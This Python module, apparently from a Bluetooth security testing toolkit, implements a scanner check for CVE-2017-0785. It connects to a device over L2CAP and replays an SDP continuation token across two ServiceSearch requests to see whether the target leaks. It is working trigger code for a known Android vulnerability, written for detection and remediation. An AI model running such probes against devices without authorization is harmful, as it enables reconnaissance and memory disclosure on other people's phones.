"""CVE detection checks for SDP (Service Discovery Protocol)."""

from __future__ import annotations

import socket
import struct

from blue_tap.attack.cve_framework import make_cve_finding as _finding
from blue_tap.fuzz.protocols.sdp import (
    SDP_ERR_INVALID_CONTINUATION,
    SDP_ERROR_RSP,
    SDP_SERVICE_SEARCH_RSP,
    UUID_L2CAP,
    UUID_SDP,
    build_continuation,
    build_service_search_req,
)

AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
BTPROTO_L2CAP = 0
def _parse_service_search_rsp(resp: bytes) -> dict | None:
    if len(resp) < 10 or resp[0] != SDP_SERVICE_SEARCH_RSP:
        return None
    param_len = struct.unpack_from(">H", resp, 3)[0]
    if len(resp) < 5 + param_len or param_len < 5:
        return None
    total_count = struct.unpack_from(">H", resp, 5)[0]
    current_count = struct.unpack_from(">H", resp, 7)[0]
    handles_end = 9 + current_count * 4
    if len(resp) < handles_end + 1:
        return None
    handles = [
        struct.unpack_from(">I", resp, 9 + i * 4)[0]
        for i in range(current_count)
    ]
    cont_len = resp[handles_end]
    if len(resp) < handles_end + 1 + cont_len:
        return None
    cont_state = resp[handles_end + 1:handles_end + 1 + cont_len]
    return {
        "total_count": total_count,
        "current_count": current_count,
        "handles": handles,
        "cont_state": cont_state,
    }


def _parse_error_rsp(resp: bytes) -> int | None:
    if len(resp) < 7 or resp[0] != SDP_ERROR_RSP:
        return None
    return struct.unpack_from(">H", resp, 5)[0]


def _check_sdp_continuation_info_leak(address: str) -> list[dict]:
    """CVE-2017-0785: cross-service continuation reuse on SDP ServiceSearch."""
    sock = None
    try:
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(6.0)
        sock.connect((address, 0x0001))

        first_req = build_service_search_req(
            [UUID_L2CAP], max_count=1, continuation=build_continuation(), tid=1
        )
        sock.sendall(first_req)
        first_resp = sock.recv(4096)
        parsed_first = _parse_service_search_rsp(first_resp)
        if parsed_first is None:
            err = _parse_error_rsp(first_resp)
            if err is not None:
                return [_finding(
                    "MEDIUM", "CVE-2017-0785: Inconclusive",
                    "Initial SDP ServiceSearch probe returned an error before continuation "
                    "state could be established.",
                    cve="CVE-2017-0785", status="inconclusive", confidence="medium",
                    evidence=f"Initial SDP error 0x{err:04X}",
                )]
            return [_finding(
                "MEDIUM", "CVE-2017-0785: Inconclusive",
                "Initial SDP ServiceSearch probe returned an unexpected response.",
                cve="CVE-2017-0785", status="inconclusive", confidence="medium",
                evidence=f"Unexpected initial SDP PDU 0x{first_resp[0]:02X}" if first_resp else "No SDP response",
            )]

        cont_state = parsed_first["cont_state"]
        if not cont_state:
            return [_finding(
                "INFO", "CVE-2017-0785: Not Applicable",
                "Cross-service continuation probe skipped — the initial L2CAP UUID search "
                "did not return continuation state to replay.",
                cve="CVE-2017-0785", status="not_applicable", confidence="high",
                evidence="Initial SDP ServiceSearch had no continuation state",
            )]

        second_req = build_service_search_req(
            [UUID_SDP], max_count=1, continuation=build_continuation(cont_state), tid=2
        )
        sock.sendall(second_req)
        second_resp = sock.recv(4096)

        err = _parse_error_rsp(second_resp)
        if err == SDP_ERR_INVALID_CONTINUATION:
            return []

        parsed_second = _parse_service_search_rsp(second_resp)
        if parsed_second is not None:
            return [_finding(
                "HIGH",
                "Android SDP Continuation State Info Leak (CVE-2017-0785)",
                "The target accepted a continuation token captured from an L2CAP UUID search "
                "and reused it in an SDP UUID search, returning another ServiceSearchResponse "
                "instead of rejecting the invalid continuation state.",
                cve="CVE-2017-0785",
                impact="Stack memory disclosure via out-of-bounds SDP continuation handling",
                remediation="Apply the Android SDP continuation-state bounds check patch.",
                status="confirmed",
                confidence="high",
                evidence=(
                    f"Replayed continuation {cont_state.hex()} across UUID searches; "
                    f"received SDP ServiceSearchResponse with handles "
                    f"{[hex(h) for h in parsed_second['handles']]}"
                ),
            )]

        if err is not None:
            return [_finding(
                "MEDIUM", "CVE-2017-0785: Inconclusive",
                "The target rejected the continuation reuse, but not with the documented "
                "invalid-continuation error code.",
                cve="CVE-2017-0785", status="inconclusive", confidence="medium",
                evidence=f"Follow-up SDP error 0x{err:04X}",
            )]

        return [_finding(
            "MEDIUM", "CVE-2017-0785: Inconclusive",
            "Continuation-state replay reached the target, but the follow-up SDP reply did "
            "not match either the documented patched or vulnerable behavior.",
            cve="CVE-2017-0785", status="inconclusive", confidence="medium",
            evidence=f"Unexpected follow-up SDP PDU 0x{second_resp[0]:02X}" if second_resp else "No follow-up SDP response",
        )]
    except OSError as exc:
        return [_finding(
            "MEDIUM", "CVE-2017-0785: Inconclusive",
            "SDP continuation-state probe did not complete cleanly.",
            cve="CVE-2017-0785", status="inconclusive", confidence="medium",
            evidence=str(exc),
        )]
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
